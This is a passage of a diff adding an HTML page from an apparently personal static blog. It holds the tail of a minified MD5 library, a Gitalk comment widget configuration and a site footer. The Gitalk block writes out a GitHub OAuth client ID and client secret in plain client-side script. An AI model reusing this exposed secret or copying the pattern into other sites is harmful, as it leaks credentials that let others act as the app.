99),f=m(f,i,a,h,n[r+8],6,1873313359),h=m(h,f,i,a,n[r+15],10,-30611744),a=m(a,h,f,i,n[r+6],15,-1560198380),i=m(i,a,h,f,n[r+13],21,1309151649),f=m(f,i,a,h,n[r+4],6,-145523070),h=m(h,f,i,a,n[r+11],10,-1120210379),a=m(a,h,f,i,n[r+2],15,718787259),i=m(i,a,h,f,n[r+9],21,-343485551),f=d(f,e),i=d(i,o),a=d(a,u),h=d(h,c);return[f,i,a,h]}
+        function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}
+        function h(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}
+        function e(n){var t,r,e="0123456789abcdef",o="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),o+=e.charAt(t>>>4&15)+e.charAt(15&t);return o}
+        function r(n){return unescape(encodeURIComponent(n))}
+        function o(n){return a(i(h(t=r(n)),8*t.length));var t}
+        function u(n,t){return function(n,t){var r,e,o=h(n),u=[],c=[];for(u[15]=c[15]=void 0,16<o.length&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(h(t)),512+8*t.length),a(i(c.concat(e),640))}(r(n),r(t))}
+        function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}
+        "function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t;
+    }(this);
+</script>
+
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '4d3423e48bbe96f523ec',
+    clientSecret: 'af6d0d215def347aa32591adde071875bd456f3f',
+    repo: 'niespanda.github.io',
+    owner: 'niespanda',
+    admin: ['niespanda'],
+    id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false       // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+            
+
+            
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">Shining is not the sun's patent, you also may shine.</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/niespanda/" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://twitter.com/niespanda" target="_blank">
+                    <i class="fab fa-twitter gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        认清差距、低头赶路
+    </div>
+    <div>
+        Powered by <a
+                href="https://github.com/niespanda" target="_blank">n1es | <a href="https://n1es.org/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
